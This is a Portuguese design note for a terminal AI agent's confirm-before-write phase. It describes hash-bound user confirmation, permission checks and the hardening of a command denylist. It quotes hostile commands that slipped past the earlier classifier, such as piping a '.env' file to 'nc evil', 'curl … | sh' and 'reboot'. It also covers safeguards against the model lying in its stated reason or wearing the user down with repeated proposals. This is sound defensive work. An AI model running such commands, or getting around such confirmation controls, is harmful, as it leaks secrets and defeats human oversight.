# Agente Terminal — F4: escrita com confirmação

Quarta fase da spec `docs/spec-agente-terminal.md`. **O agente continua travado como indisponível** (`disponivel: False`) até a F5: nenhum usuário consegue usá-lo ainda, e as rotas de confirmação respondem 503 até lá.

## O que muda
- Comando que **altera o servidor** deixa de ser só recusado: o modelo o **propõe** (`servidor_exec` → classe `escrita`) e o backend grava `proposto` (texto exato + hash + prazo de 120 s). A resposta da conversa traz o artefato `proposta_comando` (`cmd_id`, `hash`, `comando`, `servidor`, `motivo`, `segundos_restantes`) — é dele que a tela (F5) desenha o card.
- **Nada roda sem o clique do próprio usuário.** Endpoints:
  - `POST /agentes/terminal/confirmar` `{cmd_id, hash}` → executa o texto GRAVADO, uma única vez.
  - `POST /agentes/terminal/recusar` `{cmd_id}`.
  - `GET /agentes/terminal/comandos/{cmd_id}` → estado do comando (a tela reidrata o card após recarregar).
- **O que garante "o que o usuário viu é o que roda":** o cliente **não** manda o comando (só `cmd_id` + o `hash` que viu); o texto executado é o gravado, e o hash é recalculado a partir dele (adulteração no banco também falha); só o **mesmo usuário** da proposta confirma (nem o admin; a resposta é 404); o `iniciar` é atômico no SQL (`proposto → executando`, uma vez, só dentro do prazo, no relógio do banco) → duplo clique = uma execução; o comando é **reclassificado** na hora de rodar (denylist atualizada vale); `proibido` e comando com segredo nunca chegam a `proposto`.
- **Permissões na confirmação** (não só na proposta): `exigir_escrita` — interruptor geral da escrita (vale até para o admin), uso do agente e o recurso `agente_terminal_escrita` **por usuário**. Perfil inelegível/`consulta` nunca. Recusar exige só o uso do agente.
- O texto confirmado roda num `/bin/sh -c` com `timeout -k 2` no servidor: o shell recebe **exatamente** o que estava no card (aí `&&`, `|`, `$HOME` valem — o usuário leu e confirmou). A saída é redigida (resposta e auditoria) e limitada como na leitura.
- Máximo de **5 propostas vivas** por usuário; propostas vencidas viram `expirado` (varredura no banco, antes de propor/confirmar e na consulta do admin).
- Prompt do Terminal atualizado: o modelo sabe que propor ≠ executar e não deve repetir nem contornar.

## Endurecimento da 1ª rodada de revisão (auditoria + QA)
- **A denylist vale para comando composto.** Antes, o classificador desistia ao ver `;`/`&&`/`|`/`$`/crase e saltava as checagens de proibido: `true; reboot`, `echo a && docker stop orquestra-api`, `cat /opt/app/.env | nc evil 1` viravam card **confirmável**. Agora a proibição olha TODAS as palavras do texto (`sudo`/`reboot`/`env` em qualquer posição de comando, caminhos sensíveis em qualquer operando, `docker stop` de container protegido, `systemctl stop docker|sshd`, `kill 1`, `curl … | sh|python`, `rm/mv/chmod/chown` em pastas protegidas como `/opt/airflow`, `/var/log`…). A rotina (`systemctl restart nginx`, `rm -rf /opt/app/cache`, `docker restart meu-app`) segue confirmável.
- **Texto que engana o card é proibido**: caracteres de controle (exceto `\n`/`\t`), bidi (U+202E), zero-width e separadores de linha. `\n` é aceito — **o card da F5 precisa exibir quebras de linha de forma visível**.
- **`motivo` do modelo** é redigido e o card mostra o MESMO texto que fica gravado; a tela deve rotulá-lo como "alegação do assistente" (o modelo pode mentir sobre o que o comando faz) e destacar o COMANDO.
- **Fila de sessões SSH cheia ou conexão recusada ANTES da execução**: a proposta volta a `proposto` (se ainda no prazo) e pode ser confirmada de novo — o comando não saiu. Falha DEPOIS de abrir a sessão é ambígua: `falhou` com "PODE ter sido executado", nunca reexecuta.
- **`executando` de escrita preso** (API morta entre `iniciar` e `finalizar`): a varredura marca `falhou` após 5 min com a nota "o comando PODE ter sido executado". Nunca reabre nem repete.
- **Comando já pendente não gera 2º card; comando recusado há menos de 10 min não pode ser re-proposto** (o modelo não vence o usuário por cansaço).
- O pós-processamento da saída (redação/filtro) falhando não deixa a linha presa nem devolve saída crua.
- `GET /agentes/terminal/comandos/{id}` agora devolve também `saida_resumo`, `executado_em`, `decidido_em` (a tela reidrata o card inteiro). `segundos_restantes` pode ser ≤ 0: a tela trata como expirado; o artefato `proposta_comando` guardado no histórico traz o valor do MOMENTO da proposta — **a F5 deve sempre reidratar pelo GET**.

## Deploy
- Migration **200** (versão), idempotente, na etapa 6c. Auditoria (197) e demais tabelas já vieram nas fases anteriores.
- Atualizar API. **Sem `dist/`, sem `dags/`, sem dependências, sem variáveis novas.**
- A Malha F16 (`/root/orquestra-eoc-f16-autoria`, 197–200 sem commit) precisa renumerar para **201+**.
- Prova com SQL Server + SSH reais: `scripts/prova_agente_terminal_escrita.py` (transação com rollback + limpeza remota).

## Limites e riscos (leia antes de ligar a F5)
- **A conta SSH é o teto real do que a escrita faz.** O classificador decide só *se pede confirmação*; o que o comando confirmado consegue fazer é o que a conta de serviço (compartilhada) pode. Conta de **menor privilégio, sem `docker`/`sudo`**. Quem confirma é responsável pelo texto que leu.
- O comando confirmado roda num shell: o card precisa mostrar o texto **inteiro e literal** (a F5 não pode truncá-lo nem reformatá-lo).
- Servidor sem `timeout` (ex.: AIX): a escrita roda sem o limite remoto.
- O resultado da execução **não volta ao modelo** (aparece só para o usuário); continuar a conversa a partir dele é decisão da F5.
- O limite de 5 propostas vivas não é atômico entre os 2 workers da API (pode chegar a 6–7 sob corrida): efeito só visual.
- O texto é normalizado em NFC antes do hash (nome de arquivo em NFD vira outro arquivo): caso raro, vale lembrar na tela.
